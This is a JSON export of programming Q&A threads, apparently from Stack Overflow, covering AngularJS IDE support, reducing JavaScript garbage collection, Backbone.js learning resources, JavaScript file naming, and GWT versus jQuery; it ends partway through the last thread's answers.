{
    "items": [
        {
            "answer_count": 5,
            "answers": [
                {
                    "body": "<p>Someone is working in NetBeans plugin for angular. You can see it here: <a href=\"http://plugins.netbeans.org/plugin/40296/angularjs-tools\">http://plugins.netbeans.org/plugin/40296/angularjs-tools</a></p>\n\n<p>Also for Microsoft VisualStudio\n<a href=\"http://nuget.org/packages/AngularJsSeed/1.0.0-RC1\">http://nuget.org/packages/AngularJsSeed/1.0.0-RC1</a></p>\n",
                    "is_accepted": false,
                    "score": 12
                },
                {
                    "body": "<p>John Lindquist says he'll make a plugin for WebStorm:\n<a href=\"http://youtrack.jetbrains.com/issue/IDEA-84299\">http://youtrack.jetbrains.com/issue/IDEA-84299</a></p>\n",
                    "is_accepted": false,
                    "score": 24
                },
                {
                    "body": "<p>There is now a Resharper plugin for angularjs  which means if you use resharper then Visual Studio becomes a great way to develop Angular too.</p>\n\n<p><a href=\"http://blogs.jetbrains.com/dotnet/2013/02/angularjs-support-for-resharper/\">http://blogs.jetbrains.com/dotnet/2013/02/angularjs-support-for-resharper/</a></p>\n\n<p>Also there is a debugging addon for chrome now:</p>\n\n<p><a href=\"http://blog.angularjs.org/2012/07/introducing-angularjs-batarang.html\">http://blog.angularjs.org/2012/07/introducing-angularjs-batarang.html</a></p>\n",
                    "is_accepted": false,
                    "score": 6
                },
                {
                    "body": "<p>Visual Studio 2012 by far is the best. This <a href=\"http://weblogs.asp.net/dwahlin/archive/2013/04/12/video-tutorial-angularjs-fundamentals-in-60-ish-minutes.aspx\">tutorial</a> uses VS 2012 and was very helpful for me. There is also an <a href=\"http://www.microsoft.com/visualstudio/eng/products/visual-studio-express-for-windows-desktop\">Express</a> version that is free.</p>\n\n<p>The tutorial helps you get started from ground up without the need to rely on plugins.</p>\n\n<p><a href=\"https://github.com/DanWahlin/CustomerManagerStandard\">Another great Angular JS project/tutorial using Visual Studio</a></p>\n",
                    "is_accepted": false,
                    "score": 22
                },
                {
                    "body": "<p>AngularUI have written plugins that offer full AngularJS (and optionally AngularUI) IDE support for Sublime Text 2 &amp; 3 and TextMate text editors.</p>\n\n<p>Sublime Text 2 &amp; 3<br>\n<a href=\"http://www.sublimetext.com/3\" rel=\"nofollow\">http://www.sublimetext.com/3</a></p>\n\n<p>TextMate (Mac OS X only)<br>\n<a href=\"http://macromates.com/download\" rel=\"nofollow\">http://macromates.com/download</a></p>\n\n<p>AngularUI IDE Plugins<br />\nSublime - <a href=\"https://github.com/angular-ui/AngularJS-sublime-package\" rel=\"nofollow\">https://github.com/angular-ui/AngularJS-sublime-package</a><br />\nTextMate - <a href=\"https://github.com/angular-ui/AngularJS.tmbundle\" rel=\"nofollow\">https://github.com/angular-ui/AngularJS.tmbundle</a></p>\n\n<p>You can get a complete setup guide for Sublime Text here (you'll be up and running in 5 mins tops):<br>\n<a href=\"http://weblogs.asp.net/dwahlin/archive/2013/08/30/using-the-angularjs-package-for-sublime-text.aspx\" rel=\"nofollow\">http://weblogs.asp.net/dwahlin/archive/2013/08/30/using-the-angularjs-package-for-sublime-text.aspx</a></p>\n\n<p>When I'm developing early proof of concepts apps, I like to use DropBox to store my code so I can get access to everything at work and at home. Plus if you store your project in the <code>Public</code> folder, you can generate a publicly accessible url for your <code>.html</code> pages which will correctly render in the brower (i.e. correctly run your HTML, CSS &amp; JS), essentially turning DropBox into a sort of limited hosting provider.</p>\n\n<p>If you decide to use Sublime, you can download the portable version (no install required) &amp; save that to DropBox too; this way you have access to all your code AND a full AngularJS IDE from wherever you use DropBox. Which basically means you have a full dev environment in the cloud. Pretty sweet!</p>\n",
                    "is_accepted": false,
                    "score": 11
                }
            ],
            "body": "<p>I've tried WebStorm but there only seems to be a basic JavaScript support there, like in any other web IDE I have tried. I'm looking for something that would allow me to click-through from HTML pages to Controllers etc.</p>\n\n<p>If the answer is \"no\" to this question, is there any other JavaScript framework similar to Angular that would have something like an Eclipse plugin or any other kind of explicit support in some IDE?</p>\n",
            "last_activity_date": 1408239018,
            "question_id": 8361982,
            "score": 71,
            "tags": [
                "javascript",
                "ide",
                "angularjs"
            ],
            "title": "Is there an IDE with explicit support for Angular JS?"
        },
        {
            "answer_count": 4,
            "answers": [
                {
                    "body": "<p>As a general principle you'd want to cache as much as possible and do as little creating and destroying for each run of your loop.</p>\n\n<p>The first thing that pops in my head is to reduce the use of anonymous functions (if you have any) inside your main loop. Also it'd be easy to fall into the trap of creating and destroying objects that are passed into other functions. I'm by no means a javascript expert, but I would imagine that this:</p>\n\n<pre><code>var options = {var1: value1, var2: value2, ChangingVariable: value3};\nfunction loopfunc()\n{\n    //do something\n}\n\nwhile(true)\n{\n    $.each(listofthings, loopfunc);\n\n    options.ChangingVariable = newvalue;\n    someOtherFunction(options);\n}\n</code></pre>\n\n<p>would run much faster than this:</p>\n\n<pre><code>while(true)\n{\n    $.each(listofthings, function(){\n        //do something on the list\n    });\n\n    someOtherFunction({\n        var1: value1,\n        var2: value2,\n        ChangingVariable: newvalue\n    });\n}\n</code></pre>\n\n<p>Is there ever any downtime for your program? Maybe you need it to run smoothly for a second or two (e.g. for an animation) and then it has more time to process? If this is the case I could see taking objects that would normally be garbage collected throughout the animation and keeping a reference to them in some global object. Then when the animation ends you can clear all the references and let the garbage collector do it's work.</p>\n\n<p>Sorry if this is all a bit trivial compared to what you've already tried and thought of.</p>\n",
                    "is_accepted": false,
                    "score": 5
                },
                {
                    "body": "<p>I'd make one or few objects in the <code>global scope</code> (where I'm sure garbage collector is not allowed to touch them), then I'd try to refactor my solution to use those objects to get the job done, instead of using local variables.</p>\n\n<p>Of course it couldn't be done everywhere in the code, but generally that's my way to avoid garbage collector.</p>\n\n<p>P.S. It might make that specific part of code a little bit less maintainable.  </p>\n",
                    "is_accepted": false,
                    "score": 3
                },
                {
                    "body": "<p>A lot of the things you need to do to minimize GC churn go against what is considered idiomatic JS in most other scenarios, so please keep in mind the context when judging the advice I give.</p>\n\n<p>Allocation happens in modern interpreters in several places:</p>\n\n<ol>\n<li>When you create an object via <code>new</code> or via literal syntax <code>[...]</code>, or <code>{}</code>.</li>\n<li>When you concatenate strings.</li>\n<li>When you enter a scope that contains function declarations.</li>\n<li>When you perform an action that triggers an exception.</li>\n<li>When you evaluate a function expression: <code>(function (...) { ... })</code>.</li>\n<li>When you perform an operation that coerces to Object like <code>Object(myNumber)</code> or <code>Number.prototype.toString.call(42)</code></li>\n<li>When you call a builtin that does any of these under the hood, like <code>Array.prototype.slice</code>.</li>\n<li>When you use <code>arguments</code> to reflect over the parameter list.</li>\n<li>When you split a string or match with a regular expression.</li>\n</ol>\n\n<p>Avoid doing those, and pool and reuse objects where possible.</p>\n\n<p>Specifically, look out for opportunities to:</p>\n\n<ol>\n<li>Pull inner functions that have no or few dependencies on closed-over state out into a higher, longer-lived scope.  (Some code minifiers like <a href=\"https://developers.google.com/closure/compiler/\">Closure compiler</a> can inline inner functions and might improve your GC performance.)</li>\n<li>Avoid using strings to represent structured data or for dynamic addressing.  Especially avoid repeatedly parsing using <code>split</code> or regular expression matches since each requires multiple object allocations.  This frequently happens with keys into lookup tables and dynamic DOM node IDs.  For example, <code>lookupTable['foo-' + x]</code> and <code>document.getElementById('foo-' + x)</code> both involve an allocation since there is a string concatenation.  Often you can attach keys to long-lived objects instead of re-concatenating.  Depending on the browsers you need to support, you might be able to use <a href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Map\"><code>Map</code></a> to use objects as keys directly. </li>\n<li>Avoid catching exceptions on normal code-paths.  Instead of <code>try { op(x) } catch (e) { ... }</code>, do <code>if (!opCouldFailOn(x)) { op(x); } else { ... }</code>.</li>\n<li>When you can't avoid creating strings, e.g. to pass a message to a server, use a builtin like <code>JSON.stringify</code> which uses an internal native buffer to accumulate content instead of allocating multiple objects.</li>\n<li>Avoid using callbacks for high-frequency events, and where you can, pass as a callback a long-lived function (see 1) that recreates state from the message content.</li>\n<li>Avoid using <code>arguments</code> since functions that use that have to create an array-like object when called.</li>\n</ol>\n\n<p>I suggested using <code>JSON.stringify</code> to create outgoing network messages.  Parsing input messages using <code>JSON.parse</code> obviously involves allocation, and lots of it for large messages.  If you can represent your incoming messages as arrays of primitives, then you can save a lot of allocations.  The only other builtin around which you can build a parser that does not allocate is <code>String.prototype.charCodeAt</code>.  A parser for a complex format that only uses that is going to be hellish to read though.</p>\n",
                    "is_accepted": true,
                    "score": 36
                },
                {
                    "body": "<p>The Chrome developer tools have a very nice feature for tracing memory allocation.  It's called the Memory Timeline.  <a href=\"http://zetafleet.com/blog/google-chromes-heap-profiler-and-memory-timeline\" rel=\"nofollow\">This article</a> describes some details.  I suppose this is what you're talking about re the \"sawtooth\"?  This is normal behavior for most GC'ed runtimes.  Allocation proceeds until a usage threshold is reached triggering a collection.  Normally there are different kinds of collections at different thresholds.</p>\n\n<p><img src=\"http://i.stack.imgur.com/lwrwY.png\" alt=\"Memory Timeline in Chrome\"></p>\n\n<p>Garbage collections are included in the event list associated with the trace along with their duration. On my rather old notebook, ephemeral collections are occurring at about 4Mb and take 30ms.  This is 2 of your 60Hz loop iterations.  If this is an animation, 30ms collections are probably causing stutter.  You should start here to see what's going on in your environment: where the collection threshold is and how long your collections are taking. This gives you a reference point to assess optimizations. But you probably won't do better than to decrease the frequency of the stutter by slowing the allocation rate, lengthening the interval between collections. </p>\n\n<p>The next step is to use the Profiles | Record Heap Allocations feature to generate a catalog of allocations by record type.  This will quickly show which object types are consuming the most memory during the trace period, which is equivalent to allocation rate.  Focus on these in descending order of rate.  </p>\n\n<p>The techniques are not rocket science.  Avoid boxed objects when you can do with an unboxed one. Use global variables to hold and reuse single boxed objects rather than allocating fresh ones in each iteration. Pool common object types in free lists rather than abandoning them. Cache string concatenation results that are likely reusable in future iterations.  Avoid allocation just to return function results by setting variables in an enclosing scope instead.  You will have to consider each object type in its own context to find the best strategy.  If you need help with specifics, post an edit describing details of the challenge you're looking at.</p>\n\n<p>I advise against perverting your normal coding style throughout an application in a shotgun attempt to produce less garbage.  This is for the same reason you should not optimize for speed prematurely.  Most of your effort plus much of the added complexity and obscurity of code will be meaningless.  </p>\n",
                    "is_accepted": false,
                    "score": 5
                }
            ],
            "body": "<p>I have a fairly complex Javascript app, which has a main loop that is called 60 times per second.  There seems to be a lot of garbage collection going on (based on the 'sawtooth' output from the Memory timeline in the Chrome dev tools) - and this often impacts the performance of the application.</p>\n\n<p>So, I'm trying to research best practices for reducing the amount of work that the garbage collector has to do.  (Most of the information I've been able to find on the web regards avoiding memory leaks, which is a slightly different question - my memory is getting freed up, it's just that there's too much garbage collection going on.)  I'm assuming that this mostly comes down to reusing objects as much as possible, but of course the devil is in the details.</p>\n\n<p>The app is structured in 'classes' along the lines of <a href=\"http://ejohn.org/blog/simple-javascript-inheritance/\">John Resig's Simple JavaScript Inheritance</a>.</p>\n\n<p>I think one issue is that some functions can be called thousands of times per second (as they are used hundreds of times during each iteration of the main loop), and perhaps the local working variables in these functions (strings, arrays, etc.) might be the issue.</p>\n\n<p>I'm aware of object pooling for larger/heavier objects (and we use this to a degree), but I'm looking for techniques that can be applied across the board, especially relating to functions that are called very many times in tight loops.</p>\n\n<p><strong>What techniques can I use to reduce the amount of work that the garbage collector must do?</strong></p>\n\n<p>And, perhaps also - what techniques can be employed to identify which objects are being garbage collected the most? (It's a farly large codebase, so comparing snapshots of the heap has not been very fruitful)</p>\n",
            "last_activity_date": 1379074216,
            "question_id": 18364175,
            "score": 36,
            "tags": [
                "javascript",
                "garbage-collection"
            ],
            "title": "Best practices for reducing Garbage Collector activity in Javascript"
        },
        {
            "answer_count": 8,
            "answers": [
                {
                    "body": "<p>I think this is a decent tutorial. It goes over a simple (hello world kind of simple) example. It also has links to documentation and demo apps.</p>\n\n<p><a href=\"http://www.plexical.com/blog/2010/11/18/backbone-js-tutorial/\" rel=\"nofollow\">http://www.plexical.com/blog/2010/11/18/backbone-js-tutorial/</a></p>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>I forgot the <a href=\"http://backbonetutorials.com/\">Backbone tutorials!</a></p>\n\n<p>Read the <a href=\"http://documentcloud.github.com/backbone/docs/todos.html\">annotated sample application</a></p>\n\n<p>There is also this <a href=\"http://addyosmani.com/blog/building-spas-jquerys-best-friends/\">tutorial by Addy Osmani</a></p>\n\n<p>The <a href=\"http://dailyjs.com/2011/04/04/node-tutorial-19/\">dailyJS has something to say too</a>.</p>\n\n<p>And <a href=\"http://www.quora.com/What-are-some-good-resources-for-Backbone-js\">Quora has a <em>lot</em> of information</a></p>\n\n<p>And a <a href=\"http://www.codebeerstartups.com/category/backbone-js/\">very basic series for learning backbone js</a></p>\n",
                    "is_accepted": true,
                    "score": 24
                },
                {
                    "body": "<p>Brief introduction to backbone.js\n<a href=\"http://net.tutsplus.com/tutorials/javascript-ajax/getting-started-with-backbone-js/\">http://net.tutsplus.com/tutorials/javascript-ajax/getting-started-with-backbone-js/</a></p>\n",
                    "is_accepted": false,
                    "score": 6
                },
                {
                    "body": "<p>I also found this interisting tutorial for testing Backbone.js </p>\n\n<p><a href=\"http://tinnedfruit.com/2011/03/03/testing-backbone-apps-with-jasmine-sinon.html\" rel=\"nofollow\">http://tinnedfruit.com/2011/03/03/testing-backbone-apps-with-jasmine-sinon.html</a></p>\n",
                    "is_accepted": false,
                    "score": 3
                },
                {
                    "body": "<p>I know this question is already marked as answered, but just to add to the knowledge here for anyone coming across this question:</p>\n\n<p>I found this walk-through of implementing Backbone.js useful:</p>\n\n<p><a href=\"http://andyet.net/blog/2010/oct/29/building-a-single-page-app-with-backbonejs-undersc/\" rel=\"nofollow\">http://andyet.net/blog/2010/oct/29/building-a-single-page-app-with-backbonejs-undersc/</a></p>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>Peepcode has two paid screencasts on backbone</p>\n\n<ul>\n<li><a href=\"https://peepcode.com/products/backbone-js\" rel=\"nofollow\">https://peepcode.com/products/backbone-js</a></li>\n<li><a href=\"https://peepcode.com/products/backbone-ii\" rel=\"nofollow\">https://peepcode.com/products/backbone-ii</a></li>\n</ul>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>I know 2 Backbone.js resource collections you might be interested in:</p>\n\n<ul>\n<li><a href=\"http://backbonetraining.net/resources\" rel=\"nofollow\">Derick Bailey's Backbone Resources</a></li>\n<li><a href=\"https://github.com/documentcloud/backbone/wiki/Tutorials%2C-blog-posts-and-example-sites\" rel=\"nofollow\">Backbone.js Wiki Link Collection</a></li>\n</ul>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>I will added this one : <a href=\"http://aaronhardy.com/javascript/javascript-architecture-the-basics/\" rel=\"nofollow\">Aaron</a> it's really helped me out!!</p>\n",
                    "is_accepted": false,
                    "score": 3
                }
            ],
            "body": "<p>Are there any other backbone.js tutorials or learning resources for beginners than <a href=\"http://documentcloud.github.com/backbone/\">Introduction</a> or <a href=\"http://arturadib.com/hello-backbonejs/\">Hello backbone.js</a>?</p>\n",
            "last_activity_date": 1375978430,
            "question_id": 6349164,
            "score": 28,
            "tags": [
                "javascript",
                "backbone.js"
            ],
            "title": "Backbone.js tutorials and learning resources"
        },
        {
            "answer_count": 5,
            "answers": [
                {
                    "body": "<p>There is no official, <em>universal</em>, convention for naming JavaScript files.</p>\n\n<p>There are some various options:</p>\n\n<ul>\n<li><code>scriptName.js</code></li>\n<li><code>script-name.js</code></li>\n<li><code>script_name.js</code></li>\n</ul>\n\n<p>are all valid naming conventions, however <em>I</em> prefer the jQuery suggested naming convention (for jQuery plugins, although it works for any JS)</p>\n\n<ul>\n<li><code>jquery.pluginname.js</code></li>\n</ul>\n\n<p>The beauty to this naming convention is that it <strong>explicitly</strong> describes the global namespace pollution being added.</p>\n\n<ul>\n<li><code>foo.js</code> adds <code>window.foo</code></li>\n<li><code>foo.bar.js</code> adds <code>window.foo.bar</code></li>\n</ul>\n\n<hr>\n\n<p>Because I left out versioning: it should come after the full name, preferably separated by a hyphen, with periods between major and minor versions:</p>\n\n<ul>\n<li><code>foo-1.2.1.js</code></li>\n<li><code>foo-1.2.2.js</code></li>\n<li>...</li>\n<li><code>foo-2.1.24.js</code></li>\n</ul>\n",
                    "is_accepted": false,
                    "score": 16
                },
                {
                    "body": "<p>The question in the link you gave talks about naming of JavaScript variables, not about file naming, so forget about that for the context in which you ask your question.</p>\n\n<p>As to file naming, it is purely a matter of preference and taste. I prefer naming files with hyphens because then I don't have to reach for the shift key, as I do when dealing with camelCase file names; and because I don't have to worry about differences between Windows and Linux file names (Windows file names are case-insensitive, at least through XP).</p>\n\n<p>So the answer, like so many, is \"it depends\" or \"it's up to you.\" </p>\n\n<p>The one rule you should follow is to be consistent in the convention you choose.</p>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>One possible naming convention is to use something similar to the naming scheme jQuery uses. It's not universally adopted but it is pretty common.</p>\n\n<pre><code>product-name.plugin-ver.sion.filetype.js\n</code></pre>\n\n<p>where the <code>product-name</code> + <code>plugin</code> pair can also represent a <a href=\"http://www.yuiblog.com/blog/2007/06/12/module-pattern/\"><em>namespace</em> and a <em>module</em></a>. The <code>version</code> and <code>filetype</code> are usually optional.</p>\n\n<p><code>filetype</code> can be something relative to how the content of the file is. Often seen are:</p>\n\n<ul>\n<li><code>min</code> for minified files</li>\n<li><code>custom</code> for custom built or modified files</li>\n</ul>\n\n<p>Examples: </p>\n\n<ul>\n<li><code>jquery-1.4.2.min.js</code></li>\n<li><code>jquery.plugin-0.1.js</code></li>\n<li><code>myapp.invoice.js</code></li>\n</ul>\n",
                    "is_accepted": true,
                    "score": 60
                },
                {
                    "body": "<p>I'm not aware of any particular convention for javascript files as they aren't really unique on the web versus css files or html files or any other type of file like that.  There are some \"safe\" things you can do that make it less likely you will accidentally run into a cross platform issue:</p>\n\n<ol>\n<li><strong>Use all lowercase filenames.</strong>  There are some operating systems that are not case sensitive for filenames and using all lowercase prevents inadvertently using two files that differ only in case that might not work on some operating systems.</li>\n<li><strong>Don't use spaces in the filename.</strong>  While this technically can be made to work there are lots of reasons why spaces in filenames can lead to problems. </li>\n<li><strong>A dash is OK for a word separator.</strong>  If you want to use some sort of separator for multiple words instead of a space or camelcase as in <code>various-scripts.js</code>, a dash is a safe and useful and commonly used separator.</li>\n<li><strong>Think about using version numbers in your filenames.</strong>  When you want to upgrade your scripts, plan for the effects of browser or CDN caching.  The simplest way to use long term caching (for speed and efficiency), but immediate and safe upgrades when you upgrade a JS file is to include a version number in the deployed filename or path (like jQuery does with jquery-1.6.2.js) and then you bump/change that version number whenever you upgrade/change the file.  This will guarantee that no page that requests the newer version is ever served the older version from a cache.</li>\n</ol>\n",
                    "is_accepted": false,
                    "score": 22
                },
                {
                    "body": "<p>I generally prefer hyphens with lower case, but one thing not yet mentioned is that sometimes it's nice to have the file name exactly match the name of a single module or instantiable function contained within.</p>\n\n<p>For example, I have a revealing module declared with <code>var knockoutUtilityModule = function() {...}</code> within its own file named knockoutUtilityModule.js, although objectively I prefer knockout-utility-module.js.</p>\n\n<p>Similarly, since I'm using a bundling mechanism to combine scripts, I've taken to defining instantiable functions (templated view models etc) each in their own file, C# style, for maintainability. For example, ProductDescriptorViewModel lives on its own inside ProductDescriptorViewModel.js (I use upper case for instantiable functions). </p>\n",
                    "is_accepted": false,
                    "score": 2
                }
            ],
            "body": "<p>Should files be named something-with-hyphens.js, camelCased.js, or something else?</p>\n\n<p>I didn't find the answer to this question <a href=\"http://stackoverflow.com/questions/921133/javascript-naming-conventions\">here</a>.</p>\n",
            "last_activity_date": 1387227148,
            "question_id": 7273316,
            "score": 74,
            "tags": [
                "javascript",
                "naming-conventions"
            ],
            "title": "What is the javascript filename naming convention?"
        },
        {
            "answer_count": 14,
            "answers": [
                {
                    "body": "<blockquote>\n  <p>\"Horses for Courses\"</p>\n</blockquote>\n\n<p>Pick whichever one makes the most sense for the project. Some things to consider</p>\n\n<ul>\n<li>Tight timescales and more familiar with one over the other</li>\n<li>Speed and maintainability for other developers to use the chosen tool. Prevalence of one over the other may have implications here too</li>\n<li>Have any code that could be used already in the project e.g. plugins, utility functions, etc.</li>\n</ul>\n\n<p>Without knowing specifics about what the project is about, what your experience is and how open the client is to using different technologies/frameworks, there will be no decisive answer here.</p>\n\n<p>Make that list of compelling arguments for one over the other, as I have started here and then discuss with others involved on the project to come to a conclusion.</p>\n",
                    "is_accepted": false,
                    "score": 10
                },
                {
                    "body": "<p>my personal opinion would be for jQuery but thats because I never use Java and really like using the jQuery plugins.</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>Active user group and recent gaining popularity clearly indicates jQuery is the winner.</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>I would suggest using GWT for teams with people who don't understand JavaScript but are (perhaps) more comfortable with Java. With GWT, you're likely to save yourself days if not weeks in compatibility testing, and will avoid a lot of <a href=\"http://stackoverflow.com/questions/2749952/what-are-the-top-javascript-pitfalls\">common JavaScript pitfalls</a> that people new to the language smash into. GWT also has great packaging features for <a href=\"http://code.google.com/webtoolkit/doc/latest/DevGuideClientBundle.html#Image_Sprites\">CSS sprites</a>, <a href=\"http://google-web-toolkit.googlecode.com/svn/javadoc/latest/index.html?com/google/gwt/resources/client/ClientBundle.html\">embedded data</a>, and <a href=\"http://code.google.com/webtoolkit/doc/latest/DevGuide.html\">more</a>.</p>\n\n<p>However, <strong>if you know and understand JavaScript, I would use JavaScript</strong>, whatever your library of choice may be. Although I haven't had a chance to inspect GWT's generated code too closely, I saw some examples at Google I/O, and while it looked all candy and sparkles, you're likely create more elegant JavaScript code doing it the ol' fashioned way.</p>\n",
                    "is_accepted": false,
                    "score": 55
                },
                {
                    "body": "<p>If your group is most familiar with Java and you're planning on doing significant amounts of client-side functionality then you should at least evaluate GWT.  The type safety, Eclipse debugging and shared code between the server-side/client-side will feel comfortable to your Java development team.</p>\n\n<p>However, if your team is used to JavaScript programming with jQuery or another JavaScript library then it may be easier to stick to a technology that is pure JavaScript.  GWT has a way of taking over large sections of the page, which is unfamiliar to most JavaScript developers.  By take over the page I mean that typical GWT code likes to create its own DOM Elements instead of adding functionality to existing Elements on the page.  This is why many GWT apps have a \"loading...\" screen when the page first loads.  This isn't necessary, but it's the most common style of GWT development.</p>\n\n<p>The fact that generated code comes out of GWT is less relevant for most GWT developers.  GWT allows you to compile Java into something equivalent a normal java *.class file but in a JavaScript syntax that the web browser understands how to interpret.  GWT acts much more like a compiler than a template-driven code generator.  There are times that you will need to inspect the generated code but for the most part your debugging will be in Java via your Java debugger.</p>\n\n<p>Another thing to think about is that regardless of the client-side technology you choose, your development team will need to be familiar with HTML, JavaScript, CSS and browser programming in general.  GWT lets you write client-side code in a familiar Java environment but it doesn't hide the fact that you're working from within a browser.</p>\n",
                    "is_accepted": false,
                    "score": 18
                },
                {
                    "body": "<p>I agree with Russ Cam that it depends on what your team is familiar with.  When I am doing work for my personal business apps, I much prefer GWT.  I find javascript, even with jquery, to have annoying object oriented syntax.  If you have an app with 10,000 lines of UI code, jquery strikes me as something that would lead to a mess of hard to maintain code with poor reuse.</p>\n\n<p>Does anyone know of a large scale project done in jquery?</p>\n\n<p>I think if you are trying to squeeze every last byte out of the resulting filesize, don't use any library and write the javascript from scratch (ie: google homepage fade effect).</p>\n\n<p>Something to think about regarding javascript/jquery versus gwt.  If you use common object oriented principles and design patterns, you will likely get better performing code with gwt.  Why?</p>\n\n<p>Let's take the example of polymorphism.  If you write an app that uses heavy polymorphism in javascript, you will get the benefit of maintanability and code reuse this provides.  However, your code will also get the performance hit of using polymorphism.</p>\n\n<p>Now, if you used gwt, you will also get the benefit of maintanability and code reuse this provides, BUT the gwt compiler will optimize away the polymorphism into concrete class usage, hence increasing performance.</p>\n",
                    "is_accepted": false,
                    "score": 4
                },
                {
                    "body": "<p>I would go with JQuery. </p>\n\n<p>I once maintained a GWT project that eventually forced me to re-write it twice. First as a refactored GWT app, second in JQuery. </p>\n\n<p>I haven't touched Javascript seriously for a very long time. The last time was about 2002.  I'm a Java developer so my first impression of GWT was awesome. But that was just the impression.</p>\n\n<p>Problems I found with GWT:</p>\n\n<ol>\n<li><p>It forces you to follow its client/server structure. In the end all I want is AJAX and those good widgets. GWT's widgets by itself don't seem that good-looking. Aesthetically, I prefer Adobe Flex! But to keep the comparison closer, JQuery's UI looks better than GWT's. In addition you have that wonderful Theme Roller support from JQuery.</p></li>\n<li><p>I've tried DWR. It's great. It's far easier to enable AJAX in your Java code using DWR than GWT. </p></li>\n<li><p>If you're using GWT, eventually you will be forced to learn JavaScript. Arjen of SpringSource once said about XML and SOAP (though not the exact quote): \"How can you develop WebServices and not know XML? SOAP is XML. You can't avoid it\". Same thing with GWT. It's still Javascript in the end.</p></li>\n<li><p>Realistically, Javascript isn't that hard to learn vs Java. More people know Javascript than Java. Even web designers know it. You're a programmer, and you're scared of Javascript? </p></li>\n<li><p>Back to the project I rewrote. When I rewrote our GWT application it took me almost two months to rewrite it. With JQuery it took me two weeks, and I was rusty with JavaScript.</p></li>\n<li><p>With JQuery you don't really write hardcorde JavaScript. That's why you use JQuery in the first place. Maintaining code with GWT is horrible. You wanna see the latest changes you did in the code... go compile... wait for GWT... 5 minutes... rinse... and repeat and hope it doesn't throw an error. If it does, you'll be recompiling again, and waiting for another 5 minutes. Rinse and repeat. With JQuery change a line, refresh your browser. Done.</p></li>\n</ol>\n\n<p>I know I'm not being objective here, but I'm just sharing my experience :) The moral is don't be scared of Javascript. Google uses Javascript anyway</p>\n",
                    "is_accepted": false,
                    "score": 59
                },
                {
                    "body": "<p>I think GWT is too much abstraction. Javascript is in fact a powerful language. You can write object oriented code and use namespaces. With a library like jQuery you won't have to worry about browser compatibility issues for most of what you do. With all the great browser developer tools available (like Firebug) in all major browsers now a days it is very easy to work with javascript. When a javascript error occurs I can easily pinpoint where it happened in my code. I can watch variables and know all that is going on in detail because I am working against code I wrote (unlike GWT). </p>\n",
                    "is_accepted": false,
                    "score": 3
                },
                {
                    "body": "<p>The main problems I see with GWT vs. a native Javascript solution (jQuery or others) are:</p>\n\n<ul>\n<li><p>There is an additional process that separates you from your final product. You develop your app in Java and you debug the Java code, yet you release a machine translated version of this code. For a decently sized app I can't imagine that you won't need to debug the actual code running on the browser at times, and this is going to be a headache, since it isn't your code. </p></li>\n<li><p>Since you write your code in Java you are limited to use Java libraries. If you find some JS library that you like it would be awfully difficult to add it to your GWT project, you may need to write a Java wrapper for it. If you are developing native JS you can just add it to your project.</p></li>\n<li><p>JS is an awesome language in its own right, with a solid object model that is different than Java's. I have developed a few apps in native JS for HP webOS and was surprised to find that many of the preconceptions I had about the language were not true. You can write clean, efficient and maintainable code in JS as much as you can in Java, and if you take the time to understand the JS object model you won't even need to use a support library to mimic a more typical class/object model like those of Java and C++ on top of JS. Javascript's prototypes are pretty cool.</p></li>\n<li><p>If you may ever consider releasing your app on mobile platforms, then a native JS app can easily be wrapped inside phonegap and have access to several mobile platforms, without additional effort. There is a GWT wrapper for phonegap as well, but going back to my first item, if you have the choice to work with the real thing then why choose a solution that requires translation/emulation?</p></li>\n</ul>\n\n<p>Good luck.</p>\n",
                    "is_accepted": false,
                    "score": 3
                },
                {
                    "body": "<p><strong>jQuery = low-level understanding</strong></p>\n\n<p>Aside from the normal one javascript and the other is java explanation, Jquery has a closer one-to-one mapping with javascript while GWT is more abstracted away.  So if you prefer to have a deeper understanding of what's happening with your code at the low-level (javascript) then jquery is the right way.  </p>\n\n<p><strong>GWT = abstraction understanding = functional guarantee</strong></p>\n\n<p>GWT offers the advantage of compiler generated code so it may offer more of guarantee that your website will function normally.  However  like any large scale API you need to take the time to understand what this class does and what that class does and whether or not it is compatible with this API or nor.</p>\n\n<p><strong>low-level understanding may be more useful</strong></p>\n\n<p>Personally I get much more satisfaction from coding the low-level myself.  I have built some web applications at work from pure javascript that functioned flawlessly.  Once wrote javascript code that took data from a database and generated a complete microsoft word research report.  The complexity of this project demanded a lower-level grasp of javascript.  I'm not sure this could have been done easily with a java based solution.  </p>\n\n<p><strong>GWT reassures managers but costly</strong></p>\n\n<p>But then again java and asp.net tend be preferred by larger companies b/c there is greater technical support (i.e. Oracle and Microsoft) and uptight on-the-edge managers tend to get better sleep at night when they know they can solve problem A by simply paying x amount of dollars for support.  So after adopting the system they soon start realizing that technical support costs too much and it's cheaper to pay more for better developers.  Hence a java or .net career will usually put food on the table.  </p>\n\n<p><strong>Maintainability</strong></p>\n\n<p>Also API's like GWT are easier to maintain.  I could only imagine the horror that someone would go through if they had to debug my javascript code.  But that was before I became a better and cleaner programmer and since I knew every aspect of the code there is nothing to debug b/c there was never a problem with it.  </p>\n\n<p>Low-level coding gives you almost a 100% understanding of what is happening, however with API's you spend time playing bug detective on google and posting questions on sites like StackOverflow.  But managers don't understand this b/c most aren't programmers.</p>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>First of all comparing GWT with jQuery doesn't make much sense. While jQuery was build to make  cross browser working with the DOM much easier, GWT is build to create large web applications. </p>\n\n<p>So if you a bunch of static sides with some independent widgets, like calendar, slider and so on, jQuery is enough. If you want to build single page app, maybe with a large team, GWT is the better way. GWT has a lot well design architecture under the hood, especially the build in MVP pattern, UI-Binder templating system, i18n support etc. </p>\n\n<p>So as JavaScript developer working more than  year on a large GWT app, I would recommend never ever build a single page app only with jquery cause it wasn't build for. If you wanna use JavaScript take a look at backbone, spine, knockout or dojo. </p>\n\n<p>Btw, as good the GWT architecture is build, you will have a lot of JAVA overhead. So if you project is growing, the time to compile your css and i18n properties will come annoying.</p>\n",
                    "is_accepted": false,
                    "score": 15
                },
                {
